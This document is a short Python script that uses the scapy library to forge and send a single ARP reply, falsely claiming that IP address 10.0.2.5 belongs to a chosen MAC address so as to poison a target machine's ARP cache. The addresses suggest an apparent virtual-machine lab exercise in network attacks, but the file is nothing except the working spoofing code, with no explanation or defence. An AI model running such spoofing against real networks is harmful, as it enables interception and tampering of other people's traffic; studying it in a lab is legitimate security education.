from scapy.all import *

Etherpkt1 =Ether()
Etherpkt1.dst = "08:00:27:29:b9:da"
ARPpkt1 = ARP()
ARPpkt1.hwsrc = "08:00:27:c1:a6:ab"
ARPpkt1.psrc = "10.0.2.5"
ARPpkt1.op = 2	# 1 for request; 2 for reply
frame1 = Etherpkt1/ARPpkt1
sendp(frame1, count = 1) 
